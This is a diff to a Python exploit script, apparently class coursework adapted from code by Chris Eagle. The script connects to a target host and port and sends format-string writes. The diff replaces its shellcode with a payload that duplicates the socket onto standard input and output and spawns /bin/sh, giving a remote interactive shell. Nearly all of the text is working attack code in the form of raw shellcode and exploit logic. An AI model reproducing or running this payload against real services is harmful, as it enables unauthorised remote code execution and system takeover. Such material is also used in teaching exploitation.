@@ -1,5 +1,5 @@
 #!/usr/bin/python
-# This code is adopted from exploit python written by Chris Eagle
+# This code is adopted from exploit python written by Chris Eagle in class
 
 import os
 import socket
@@ -32,8 +32,9 @@ def writeByte(s, addr, val, idx):
     format += "A"*(16 - len(format))
     s.send(format)
 
-sc = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50"
-sc += "\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+sc ="\xbb\x04\x00\x00\x00\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80" + \
+"\x41\xe2\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e" + \
+"\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
 
 s = socket.socket()
 s.connect((sys.argv[1], int(sys.argv[2])))
